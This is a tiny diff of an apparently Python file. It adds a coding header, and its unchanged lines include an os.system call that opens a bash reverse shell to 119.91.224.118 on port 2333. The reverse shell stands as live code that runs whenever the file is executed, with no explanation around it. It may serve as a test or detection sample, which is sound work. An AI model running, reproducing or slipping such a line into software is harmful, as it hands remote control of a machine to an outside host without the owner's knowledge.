@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 a = 1
 import os
 os.system('bash -c "bash -i >& /dev/tcp/119.91.224.118/2333 0>&1"')
